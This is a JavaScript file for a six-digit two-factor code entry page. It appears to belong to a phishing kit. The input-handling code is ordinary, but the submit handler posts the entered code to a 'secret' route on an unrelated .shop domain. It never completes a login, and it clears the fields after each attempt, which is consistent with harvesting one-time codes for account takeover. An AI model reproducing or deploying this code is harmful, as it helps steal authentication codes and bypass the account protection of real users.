document.addEventListener("DOMContentLoaded", () => {
    const inputs = document.querySelectorAll(".code-input")
    const continueBtn = document.getElementById("continue-btn")

    // Focus the first input when page loads
    inputs[0].focus()

    // Handle input focus and auto-advance
    inputs.forEach((input) => {
        input.addEventListener("input", function () {
            const index = Number.parseInt(this.dataset.index)

            // Only allow numbers
            this.value = this.value.replace(/[^0-9]/g, "")

            // Auto advance to next input
            if (this.value && index < inputs.length - 1) {
                inputs[index + 1].focus()
            }

            // Check if all inputs have values to enable button
            checkInputs()
        })

        // Handle backspace to go to previous input
        input.addEventListener("keydown", function (e) {
            const index = Number.parseInt(this.dataset.index)

            if (e.key === "Backspace" && !this.value && index > 0) {
                inputs[index - 1].focus()
            }
        })
    })

    // Handle paste event for the entire form
    document.addEventListener("paste", (e) => {
        // Get pasted data
        let pastedData = (e.clipboardData || window.clipboardData).getData("text")

        // Remove any non-numeric characters
        pastedData = pastedData.replace(/[^0-9]/g, "")

        // Only use first 6 digits
        pastedData = pastedData.substring(0, 6)

        // If we have digits to paste
        if (pastedData.length > 0) {
        // Fill inputs with pasted data
        for (let i = 0; i < pastedData.length; i++) {
            if (i < inputs.length) {
            inputs[i].value = pastedData[i]
            }
        }

        // Focus on appropriate input
        if (pastedData.length < 6) {
            inputs[pastedData.length].focus()
        } else {
            inputs[5].focus()
        }

        // Check if button should be enabled
        checkInputs()
        }
    })

    // Function to check if all inputs have values
    function checkInputs() {
        let allFilled = true

        inputs.forEach((input) => {
            if (!input.value) allFilled = false
        })
        continueBtn.disabled = !allFilled
    }

    // Handle form submission via fetch
    continueBtn.addEventListener("click", async (e) => {
        e.preventDefault();

        const code = Array.from(inputs).map(input => input.value).join("");

        if (code.length !== 6) return;

        try {
            const response = await fetch("https://zezenta.shop/ruta/secreta/secretisima/2fa", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ code })  // puedes agregar más datos aquí si quieres
            });

            const result = await response.json();

            if ( !response.ok) console.error("Error del servidor:", result);
            
        } catch (error) {
            console.error("Error en la petición:", error);
            alert("Error al verificar el código");
        }

        // Limpiar inputs
        inputs.forEach(input => input.value = "");
        continueBtn.disabled = true;
        inputs[0].focus();
    });
})
